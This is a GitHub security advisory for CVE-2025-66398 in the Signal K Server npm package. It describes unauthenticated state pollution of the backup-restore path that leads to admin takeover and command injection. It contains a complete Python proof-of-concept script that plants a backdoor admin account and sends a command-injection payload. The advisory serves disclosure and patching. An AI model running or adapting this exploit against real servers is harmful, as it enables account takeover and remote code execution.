# [C] Signal K Server has Unauthenticated State Pollution leading to Remote Code Execution (RCE)

## Summary
Severity: Critical
Advisory: GHSA-w3x5-7c4c-66p9
CVE: CVE-2025-66398
CWE: CWE-78, CWE-913
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-w3x5-7c4c-66p9
Type: github-advisory

## Affected
- npm: `signalk-server` — affected >=0 <2.19.0

## Details
### Summary
An unauthenticated attacker can pollute the internal state (`restoreFilePath`) of the server via the `/skServer/validateBackup` endpoint. This allows the attacker to hijack the administrator's "Restore" functionality to overwrite critical server configuration files (e.g., `security.json`, `package.json`), leading to account takeover and Remote Code Execution (RCE).

### Details
The vulnerability is caused by the use of a module-level global variable `restoreFilePath` in `src/serverroutes.ts`, which is shared across all requests.

**Vulnerable Code Analysis:**
1.  **Global State**: `restoreFilePath` is defined at the top level of the module.
    ```typescript
    // src/serverroutes.ts
    let restoreFilePath: string
    ```
2.  **Unauthenticated State Pollution**: The `/skServer/validateBackup` endpoint updates this variable. Crucially, this endpoint **lacks authentication middleware**, allowing any user to access it.
    ```typescript
    app.post(`${SERVERROUTESPREFIX}/validateBackup`, (req, res) => {
      // ... handles file upload ...
      restoreFilePath = fs.mkdtempSync(...) // Attacker controls this path
    })
    ```
3.  **Restore Hijacking**: The `/skServer/restore` endpoint uses the polluted `restoreFilePath` to perform the restoration.
    ```typescript
    app.post(`${SERVERROUTESPREFIX}/restore`, (req, res) => {
      // ...
      const unzipStream = unzipper.Extract({ path: restoreFilePath }) // Uses polluted path
      // ...
    })
    ```

**Exploit Chain:**
1.  **Pollution**: Attacker uploads a malicious zip file to `/validateBackup`. The server saves it and updates `restoreFilePath` to point to this malicious file.
2.  **Hijacking**: When `/restore` is triggered (either by the attacker if they have access, or by a legitimate admin), the server restores the attacker's malicious files.
3.  **Backdoor**: The attacker overwrites `security.json` to add a new administrator account.
4.  **RCE**: Using the new admin account, the attacker exploits a separate Command Injection vulnerability in the App Store (`/skServer/appstore/install/...`) to execute arbitrary system commands (e.g., `npm install` injection).

### PoC
Here is a complete Python script to reproduce the full exploit chain.

```python
import requests
import zipfile
import io
import json
import time

# Configuration
TARGET_URL = "http://localhost:3000"
BACKDOOR_USER = "hacker"
BACKDOOR_PASS = "hacked1234"

def step1_plant_backdoor():
    print("[*] Step 1: Planting Backdoor via State Pollution...")
    
    # 1. Create malicious zip with security.json
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as z:
        # Add backdoor admin user
        security_config = {
            "users": [{
                "username": BACKDOOR_USER,
                "password": BACKDOOR_PASS, 
                "permissions": "admin"
            }]
        }
        z.writestr("security.json", json.dumps(security_config))
        # Enable security to make the backdoor effective
        z.writestr("settings.json", json.dumps({"security": {"strategy": "./tokensecurity"}}))
    zip_buffer.seek(0)

    # 2. Pollute State (Unauthenticated)
    print("    [+] Sending malicious backup to /validateBackup...")
    res = requests.post(f"{TARGET_URL}/skServer/validateBackup", 
                        files={'file': ('malicious.zip', zip_buffer, 'application/zip')})
    if res.status_code != 200:
        print("    [-] Failed to pollute state.")
        return False

    # 3. Trigger Restore (Hijacking)
    print("    [+] Triggering restore to overwrite server config...")
    # Note: In a real attack, if /restore is protected, attacker waits for admin to use it.
    # Here we assume we can trigger it or security is currently off.
    res = requests.post(f"{TARGET_URL}/skServer/restore", json={"security.json": True, "settings.json": True})
    
    if res.status_code in [200, 202]:
        print("    [+] Restore triggered successfully. Backdoor planted.")
        print("    [!] PLEASE RESTART THE SERVER to load the new configuration.")
        return True
    else:
        print(f"    [-] Restore failed: {res.status_code} {res.text}")
        return False

def step2_execute_rce():
    print("\n[*] Step 2: Executing RCE as Backdoor User...")
    
    # 1. Login
    session = requests.Session()
    login_payload = {"username": BACKDOOR_USER, "password": BACKDOOR_PASS}
    res = session.post(f"{TARGET_URL}/signalk/v1/auth/login", json=login_payload)
    
    if res.status_code != 200:
        print("    [-] Login failed. Did you restart the server?")
        return
    
    token = res.json()['token']
    print("    [+] Login successful. Authenticated as Admin.")

    # 2. RCE Payload (Windows Example)
    # Injecting command into version parameter of npm install
    # Command: echo RCE_SUCCESS > rce_proof.txt
    cmd_payload = "1.0.0 & echo RCE_SUCCESS > rce_proof.txt &"
    
    # We need a valid package name to bypass existence check
    package_name = "@signalk/freeboard-sk" 
    
    print(f"    [+] Sending RCE payload: {cmd_payload}")
    headers = {'Authorization': f'Bearer {token}'}
    try:
        session.post(f"{TARGET_URL}/skServer/appstore/install/{package_name}/{cmd_payload}", 
                     headers=headers, timeout=5)
    except:
        pass # Timeout is expected as the command might hang or take time

    print("    [+] Payload sent. Check for 'rce_proof.txt' in server root.")

if __name__ == "__main__":
    # Run Step 1, then restart server manually, then Run Step 2
    # step1_plant_backdoor()
    step2_execute_rce()
```

### Impact
Remote Code Execution (RCE), Account Takeover, Denial of Service.
**Verified**: RCE is demonstrated by creating a file named `rce_proof.txt` containing the text "RCE_SUCCESS" on the server filesystem using the exploit chain.

## References
- https://github.com/SignalK/signalk-server/security/advisories/GHSA-w3x5-7c4c-66p9
- https://nvd.nist.gov/vuln/detail/CVE-2025-66398
- https://github.com/SignalK/signalk-server/commit/5c211eaf33f0ccadbaed6720264780d92afbd7f8
- https://github.com/SignalK/signalk-server
- https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
